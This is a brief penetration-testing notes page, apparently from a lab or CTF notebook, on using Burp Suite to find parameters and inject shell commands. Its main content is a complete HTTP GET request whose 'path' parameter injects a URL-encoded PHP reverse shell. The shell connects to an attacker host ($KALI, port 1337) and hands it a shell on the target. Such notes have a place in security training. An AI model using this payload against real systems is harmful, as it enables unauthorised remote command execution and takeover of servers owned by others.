# Burp



## Find Parameters

Try using burp suite intruder to brute force to find other parameters&#x20;

## Run Shell Commands

try adding ; and then a command.

**Burp Request**

```
GET /index.php?path=;php+-r+'$sock%3dfsockopen("$KALI",1337)%3bexec("sh+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: 10.10.128.4
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```





